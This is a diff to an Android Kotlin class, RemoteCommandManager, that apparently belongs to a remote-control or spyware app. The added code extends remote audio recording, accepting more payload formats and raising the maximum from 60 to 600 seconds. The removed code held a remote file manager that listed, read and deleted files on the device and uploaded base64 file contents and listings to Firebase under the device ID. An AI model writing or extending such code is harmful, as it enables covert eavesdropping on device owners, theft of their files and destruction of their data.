@@ -354,9 +354,6 @@ class RemoteCommandManager(private val context: Context) {
                 "REMOTE_RECORD_AUDIO", "RECORD_AUDIO", "AUDIO_RECORD", "START_AUDIO_RECORD" -> {
                     resultMessage = recordAudioRemote(payload)
                 }
-                "REMOTE_FILE_MANAGER", "FILE_MANAGER", "LIST_FILES", "READ_FILE", "DELETE_FILE", "DOWNLOAD_FILE", "FILE_LIST", "FILE_DELETE", "FILE_READ" -> {
-                    resultMessage = handleRemoteFileManager(commandType, payload)
-                }
                 else -> {
                     resultMessage = "Executed command $commandType with payload $payload"
                 }
@@ -744,16 +741,27 @@ class RemoteCommandManager(private val context: Context) {
         if (trimmed.startsWith("{")) {
             try {
                 val json = JSONObject(trimmed)
-                val d = json.optLong("duration", json.optLong("seconds", 10L))
+                val d = when {
+                    json.has("duration") -> json.optLong("duration")
+                    json.has("seconds") -> json.optLong("seconds")
+                    json.has("durationSeconds") -> json.optLong("durationSeconds")
+                    json.has("sec") -> json.optLong("sec")
+                    json.has("length") -> json.optLong("length")
+                    else -> 10L
+                }
                 if (d > 0) durationSec = d
             } catch (_: Exception) {}
+        } else if (trimmed.contains("=")) {
+            val valPart = trimmed.substringAfter("=").trim().filter { it.isDigit() }
+            val parsed = valPart.toLongOrNull()
+            if (parsed != null && parsed > 0) durationSec = parsed
         } else {
             val parsed = trimmed.filter { it.isDigit() }.toLongOrNull()
             if (parsed != null && parsed > 0) {
                 durationSec = parsed
             }
         }
-        val finalDuration = durationSec.coerceIn(3L, 60L)
+        val finalDuration = durationSec.coerceIn(1L, 600L)
 
         val outFile = File(context.cacheDir, "remote_audio_${System.currentTimeMillis()}.m4a")
 
@@ -813,115 +821,6 @@ class RemoteCommandManager(private val context: Context) {
             throw e
         } finally {
             try { if (outFile.exists()) outFile.delete() } catch (_: Exception) {}
-        }
-    }
-
-    private suspend fun handleRemoteFileManager(commandType: String, payload: String): String = withContext(Dispatchers.IO) {
-        var action = "list"
-        var targetPath = "/storage/emulated/0"
-
-        val trimmed = payload.trim()
-        if (trimmed.startsWith("{")) {
-            try {
-                val json = JSONObject(trimmed)
-                action = json.optString("action", json.optString("type", "list")).lowercase()
-                targetPath = json.optString("path", json.optString("filePath", targetPath))
-            } catch (_: Exception) {}
-        } else if (trimmed.contains("|")) {
-            val parts = trimmed.split("|", limit = 2)
-            action = parts[0].trim().lowercase()
-            targetPath = parts[1].trim()
-        } else if (trimmed.isNotEmpty()) {
-            val cmdUpper = commandType.uppercase()
-            if (cmdUpper.contains("DELETE") || cmdUpper.contains("RM")) {
-                action = "delete"
-                targetPath = trimmed
-            } else if (cmdUpper.contains("READ") || cmdUpper.contains("DOWNLOAD") || cmdUpper.contains("GET")) {
-                action = "read"
-                targetPath = trimmed
-            } else {
-                targetPath = trimmed
-            }
-        }
-
-        val cmdUpper = commandType.uppercase()
-        if (cmdUpper == "LIST_FILES" || cmdUpper == "FILE_LIST") action = "list"
-        if (cmdUpper == "READ_FILE" || cmdUpper == "FILE_READ" || cmdUpper == "DOWNLOAD_FILE") action = "read"
-        if (cmdUpper == "DELETE_FILE" || cmdUpper == "FILE_DELETE") action = "delete"
-
-        val deviceId = try {
-            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
-        } catch (_: Exception) { "DEVICE_${Build.MODEL}" }
-
-        when (action) {
-            "delete", "rm" -> {
-                val f = File(targetPath)
-                if (!f.exists()) throw IllegalArgumentException("File or folder does not exist at path: $targetPath")
-                val deleted = if (f.isDirectory) f.deleteRecursively() else f.delete()
-                if (!deleted) throw Exception("Failed to delete '$targetPath'. Permission denied or file locked.")
-                "Successfully deleted '${f.name}' at path '$targetPath'."
-            }
-            "read", "download", "get" -> {
-                val f = File(targetPath)
-                if (!f.exists() || !f.isFile) throw IllegalArgumentException("Invalid file path: $targetPath")
-                if (f.length() > 5 * 1024 * 1024) throw IllegalArgumentException("File size exceeds 5MB limit (${f.length() / (1024 * 1024)}MB).")
-
-                val bytes = f.readBytes()
-                val base64Str = Base64.encodeToString(bytes, Base64.NO_WRAP)
-                val fileData = mapOf(
-                    "fileName" to f.name,
-                    "filePath" to f.absolutePath,
-                    "fileSizeBytes" to f.length(),
-                    "lastModified" to f.lastModified(),
-                    "timestamp" to System.currentTimeMillis(),
-                    "contentBase64" to base64Str
-                )
-
-                try {
-                    val rtdb = FirebaseDatabase.getInstance()
-                    rtdb.getReference("devices/$deviceId/file_manager/last_downloaded").setValue(fileData)
-                } catch (e: Exception) {
-                    Log.e("RemoteCommandManager", "Failed to upload file to RTDB: ${e.message}")
-                }
-
-                "Read file '${f.name}' (${bytes.size / 1024} KB). Uploaded content to Cloud."
-            }
-            else -> {
-                var dir = File(targetPath)
-                if (!dir.exists() || !dir.isDirectory) {
-                    dir = File("/storage/emulated/0")
-                    if (!dir.exists() || !dir.isDirectory) {
-                        dir = context.filesDir
-                    }
-                }
-
-                val filesList = dir.listFiles()?.map { item ->
-                    mapOf(
-                        "name" to item.name,
-                        "path" to item.absolutePath,
-                        "isDir" to item.isDirectory,
-                        "sizeBytes" to if (item.isFile) item.length() else 0L,
-                        "lastModified" to item.lastModified()
-                    )
-                }?.sortedWith(compareBy({ !(it["isDir"] as Boolean) }, { (it["name"] as String).lowercase() })) ?: emptyList()
-
-                val dirSummary = mapOf(
-                    "currentPath" to dir.absolutePath,
-                    "parentPath" to (dir.parent ?: ""),
-                    "itemCount" to filesList.size,
-                    "timestamp" to System.currentTimeMillis(),
-                    "items" to filesList
-                )
-
-                try {
-                    val rtdb = FirebaseDatabase.getInstance()
-                    rtdb.getReference("devices/$deviceId/file_manager/current_directory").setValue(dirSummary)
-                } catch (e: Exception) {
-                    Log.e("RemoteCommandManager", "Failed to upload dir listing to RTDB: ${e.message}")
-                }
-
-                "Listed ${filesList.size} items in directory '${dir.absolutePath}'."
-            }
         }
     }
 }
